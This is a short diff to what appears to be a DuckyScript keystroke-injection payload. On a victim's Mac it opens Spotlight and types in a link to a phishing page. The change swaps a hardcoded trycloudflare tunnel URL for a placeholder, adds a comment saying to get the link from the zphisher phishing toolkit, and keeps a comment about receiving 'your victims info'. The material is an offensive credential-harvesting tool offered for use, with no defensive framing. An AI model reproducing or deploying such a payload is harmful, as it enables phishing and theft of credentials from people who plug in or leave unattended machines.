@@ -14,7 +14,8 @@ REM Anyway, enough yapping about let's get into it. This first part will close o
 REM
 GUI SPACE
 DELAY 100
-STRING https://faces-overcome-horse-weighted.trycloudflare.com
+STRING CHANGE_ME_TO_YOUR_LINK
+REM Get link from zphisher toolkit!
 ENTER
 DELAY 100
 REM !!!!!!README!!!!!! If you want to recieve your victims info (instead of me since the link is auto set to mine lol)
